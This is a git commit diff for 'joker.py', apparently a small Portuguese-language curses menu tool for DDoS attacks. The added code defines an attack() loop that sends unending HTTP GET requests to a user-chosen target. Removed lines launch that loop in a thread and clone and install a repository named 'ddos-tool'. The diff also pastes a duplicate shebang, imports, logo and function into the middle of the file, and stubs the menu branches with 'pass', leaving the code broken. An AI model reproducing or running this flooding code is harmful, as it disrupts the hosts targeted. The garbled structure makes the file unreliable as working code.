6f79b5ea311005ab3ca28a8808e2c0cf1afb01ea
Nox <157261017+Soulsfuck@users.noreply.github.com>
2024-05-14 22:13:42 -0300

    Update joker.py

--- joker.py
+++ joker.py
@@ -55,6 +55,63 @@ def attack(target, message):
         except Exception as e:
             print("Failed to send request:", e)
         time.sleep(random.uniform(0.5, 2.0))  
+#!usr/bin/python3
+
+import requests
+import threading
+import argparse
+import os
+import subprocess
+import curses
+import random
+import time
+
+TARGET = ""
+
+LOGO = """
+
+ ######   ####    ######   #### 
+     ##  #    #       ##  #    #
+     ##  #    #       ##  #    #
+ #   ##  #    #  #    ##  #    #   
+  ####    ####    #####    ####  
+
+███████████████████████████
+███████▀▀▀░░░░░░░▀▀▀███████
+████▀░░░░░░░░░░░░░░░░░▀████
+███│░░░░░░░░░░░░░░░░░░░│███
+██▌│░░░░░░░░░░░░░░░░░░░│▐██
+██░└┐░░░░░░░░░░░░░░░░░┌┘░██
+██░░└┐░░░░░░░░░░░░░░░┌┘░░██
+██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
+██▌░│██████▌░░░▐██████│░▐██
+███░│▐███▀▀░░▄░░▀▀███▌│░███
+██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
+██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
+████▄─┘██▌░░░░░░░▐██└─▄████
+█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
+████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
+█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
+███████▄░░░░░░░░░░░▄███████
+██████████▄▄▄▄▄▄▄██████████
+███████████████████████████
+   
+
+
+
+
+
+
+"""
+
+def attack(target, message):
+    while True:
+        try:
+            response = requests.get(target)
+            print("Request sent to:", target)
+        except Exception as e:
+            print("Failed to send request:", e)
+        time.sleep(random.uniform(0.5, 2.0))  
 
 
 def main(stdscr):
@@ -74,41 +131,22 @@ def main(stdscr):
     current_option = 0
 
     while True:
-        key = stdscr.getkey()
+        key = stdscr.getch()  
 
-        if key == "KEY_UP" and current_option > 0:
+        if key == curses.KEY_UP and current_option > 0:
             current_option -= 1
-        elif key == "KEY_DOWN" and current_option < len(options) - 1:
+        elif key == curses.KEY_DOWN and current_option < len(options) - 1:
             current_option += 1
-        elif key == "ENTER":
+        elif key == curses.KEY_ENTER or key in [10, 13]:  
             if options[current_option][1] == "a":
-                stdscr.clear()
-                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Informe o alvo:")
-                stdscr.addstr(1, (stdscr.cols // 2) - 15, "IP/DOMÍNIO:")
-                stdscr.refresh()
-                target_ip = stdscr.getstr(0, (stdscr.cols // 2) + 15, 15)
-                TARGET = target_ip.decode()
-                message = "http://{}".format(TARGET)
-                threading.Thread(target=attack, args=(TARGET, message)).start()
-                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Ataque iniciado! Pressione qualquer tecla para sair...")
-                stdscr.getkey()
-                stdscr.clear()
+               
+                pass
             elif options[current_option][1] == "c":
-                stdscr.clear()
-                stdscr.addstr(0, (stdscr.cols // 2) - 20, "Clonando repositório...")
-                stdscr.refresh()
-                subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
-                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Repositório clonado com sucesso! Pressione qualquer tecla para continuar...")
-                stdscr.getkey()
-                stdscr.clear()
+            
+                pass
             elif options[current_option][1] == "i":
-                stdscr.clear()
-                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Instalando dependências...")
-                stdscr.refresh()
-                subprocess.run(["python3", "-m", "pip", "install", "-r", "ddos-tool/requirements.txt"])
-                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Dependências instaladas com sucesso! Pressione qualquer tecla para continuar...")
-                stdscr.getkey()
-                stdscr.clear()
+          
+                pass
             elif options[current_option][1] == "q":
                 break
 
